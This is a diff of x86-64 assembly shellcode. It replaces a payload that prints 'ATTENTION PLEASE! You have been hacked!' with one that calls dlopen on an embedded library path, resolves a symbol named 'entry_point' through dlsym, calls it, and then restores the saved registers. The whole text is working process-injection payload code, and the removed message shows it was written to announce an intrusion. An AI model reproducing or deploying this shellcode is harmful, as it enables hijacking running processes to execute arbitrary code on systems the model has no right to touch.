@@ -4,43 +4,61 @@ global _start
 
 _start:
     push rax
+    push rbx
+    push rcx
+    push rdx
     push rdi
     push rsi
-    push rdx
+    push rbp
     jmp short _trick
 
 _code:
     xor rax, rax
     xor rdi, rdi
     xor rdx, rdx
+    pop rbx;
 
-_write:
-    ; ssize_t write(int fd, const void *buf, size_t count);
-    mov al, 1                      ; rax = 1 (syscall write)
-    inc rdi                        ; rdi = 1 (fd = 1, STDOUT)
-    pop rsi                        ; rsi = *(msg)
-    mov dl, _len                   ; rdx = len(msg)
-    syscall                        ; write(1, string, len(string))
-
-_nanosleep:
-    push 0x0;
-    push 0x1;
-    mov rdi, rsp
-    mov rax, 35
+_dlopen:
+    mov rdi, rbx
+    add rdi, 24                    ; rdi = *(msg)
     xor rsi, rsi
-    syscall
-    pop rax
+    inc rsi
+    mov rbp, rsp
+    sub rbp, 0x1000
+    mov rcx, [rbx]
+    call rcx
+    test rax, rax
+    je _restore
+
+_next:
+    call _dlsym
+
+_symbol:
+    db "entry_point", 0x0
+
+_dlsym:
+    pop rsi
+    mov rdi, rax
+    mov rcx, rbx
+    add rcx, 8
+    mov rcx, [rcx]
+    call rcx
+    test rax, rax
+    je _restore
+    call rax
+
+_restore:
+    pop rbp
+    pop rsi
+    pop rdi
+    pop rdx
+    pop rcx
+    pop rbx
     pop rax
 
 _ret:
-    pop rdx
-    pop rsi
-    pop rdi
-    pop rax
     ret
 
 _trick:
     call _code
-    _msg: db 0xa, 0xa, "ATTENTION PLEASE! You have been hacked!", 0xa, 0xa, 0xa
-    _len: equ $ - _msg
 
